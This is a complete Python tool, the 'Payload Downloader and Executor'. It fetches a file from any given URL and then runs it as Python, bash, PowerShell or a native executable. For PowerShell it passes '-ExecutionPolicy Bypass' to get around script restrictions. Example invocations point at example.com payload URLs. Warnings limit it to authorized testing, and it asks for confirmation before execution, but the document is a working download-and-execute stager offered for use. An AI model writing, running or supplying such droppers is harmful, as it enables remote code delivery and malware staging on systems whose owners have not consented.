#!/usr/bin/env python3
"""
Payload Downloader and Executor

WARNING: This script downloads and executes code from a remote source.
Only use this in authorized security testing, CTF challenges, or educational contexts.
"""

import os
import sys
import subprocess
import argparse
from pathlib import Path
from urllib.request import urlretrieve
from urllib.error import URLError, HTTPError


def download_file(url, destination_path):
    """
    Download a file from a URL to a specified destination.

    Args:
        url: The URL to download from
        destination_path: The local path where the file will be saved

    Returns:
        bool: True if download successful, False otherwise
    """
    try:
        print(f"[*] Downloading from: {url}")
        print(f"[*] Saving to: {destination_path}")

        urlretrieve(url, destination_path)

        print("[+] Download completed successfully")
        return True

    except HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        return False
    except URLError as e:
        print(f"[-] URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"[-] Unexpected error during download: {str(e)}")
        return False


def execute_payload(file_path, args=None):
    """
    Execute the downloaded payload file.

    Args:
        file_path: Path to the payload file
        args: Optional list of arguments to pass to the payload

    Returns:
        int: Return code from the executed process
    """
    try:
        print(f"\n[*] Executing payload: {file_path}")

        # Make the file executable if on Unix-like system
        if sys.platform != 'win32':
            os.chmod(file_path, 0o755)
            print("[*] Set executable permissions")

        # Determine how to execute based on file extension
        file_ext = Path(file_path).suffix.lower()

        if file_ext == '.py':
            cmd = [sys.executable, file_path]
        elif file_ext in ['.sh', '.bash']:
            cmd = ['bash', file_path]
        elif file_ext == '.ps1':
            cmd = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path]
        elif sys.platform == 'win32' and file_ext in ['.exe', '.bat', '.cmd']:
            cmd = [file_path]
        else:
            # Try to execute directly
            cmd = [file_path]

        # Add any additional arguments
        if args:
            cmd.extend(args)

        print(f"[*] Command: {' '.join(cmd)}")
        print("[*] Starting execution...\n")
        print("=" * 60)

        # Execute the payload
        result = subprocess.run(cmd, check=False)

        print("=" * 60)
        print(f"\n[*] Execution completed with return code: {result.returncode}")

        return result.returncode

    except PermissionError:
        print(f"[-] Permission denied when trying to execute: {file_path}")
        return 1
    except FileNotFoundError as e:
        print(f"[-] File or interpreter not found: {e}")
        return 1
    except Exception as e:
        print(f"[-] Error during execution: {str(e)}")
        return 1


def main():
    parser = argparse.ArgumentParser(
        description='Download and execute a payload file',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python download_and_execute.py -u http://example.com/payload.py -d /tmp/payload.py
  python download_and_execute.py -u http://example.com/script.sh -d ./script.sh --no-execute
  python download_and_execute.py -u http://example.com/tool.py -d ./tool.py -a "--help"

WARNING: Only use this tool in authorized security testing contexts!
        """
    )

    parser.add_argument('-u', '--url', required=True,
                        help='URL of the payload file to download')
    parser.add_argument('-d', '--destination', required=True,
                        help='Destination path where the file will be saved')
    parser.add_argument('-a', '--args', nargs='*',
                        help='Optional arguments to pass to the payload')
    parser.add_argument('--no-execute', action='store_true',
                        help='Download only, do not execute')
    parser.add_argument('--force', action='store_true',
                        help='Overwrite existing file without prompting')

    args = parser.parse_args()

    # Resolve and create destination directory if needed
    dest_path = Path(args.destination).resolve()
    dest_dir = dest_path.parent

    # Create directory if it doesn't exist
    try:
        dest_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"[-] Failed to create destination directory: {e}")
        return 1

    # Check if file already exists
    if dest_path.exists() and not args.force:
        response = input(f"[!] File already exists: {dest_path}\n[?] Overwrite? (y/n): ")
        if response.lower() != 'y':
            print("[*] Aborted by user")
            return 0

    # Download the payload
    success = download_file(args.url, str(dest_path))

    if not success:
        print("[-] Download failed")
        return 1

    # Execute the payload if requested
    if not args.no_execute:
        print("\n[!] WARNING: About to execute downloaded code!")
        response = input("[?] Continue with execution? (y/n): ")

        if response.lower() != 'y':
            print("[*] Execution cancelled by user")
            return 0

        return_code = execute_payload(str(dest_path), args.args)
        return return_code
    else:
        print("[*] Download complete. Execution skipped (--no-execute flag)")
        return 0


if __name__ == '__main__':
    sys.exit(main())
